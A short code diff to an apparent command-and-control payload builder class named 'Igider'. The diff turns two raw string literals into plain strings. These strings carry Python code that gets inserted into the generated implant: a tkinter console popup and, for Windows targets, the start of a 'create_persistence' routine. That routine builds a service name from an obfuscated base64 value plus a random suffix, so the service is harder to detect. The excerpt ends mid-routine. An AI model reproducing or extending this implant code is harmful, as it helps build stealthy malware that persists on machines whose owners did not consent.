@@ -393,7 +393,7 @@ class Igider(PayloadType):
                 else:
                     command_code += self._load_module_content(command_path) + "\n"
 
-            command_code += (r"""
+            command_code += ("""
     import tkinter 
     def show_console_popup(self, duration=5000):
         msg = (
@@ -431,7 +431,7 @@ class Igider(PayloadType):
 
                                 """)
             if selected_os == "windows":
-                command_code +=(r"""
+                command_code +=("""
     def create_persistence(self):
         try:
             svc_name = dec(b'<base64_encoded_obf_svc_name>') + str(random.randint(1000, 9999))  # Randomized name
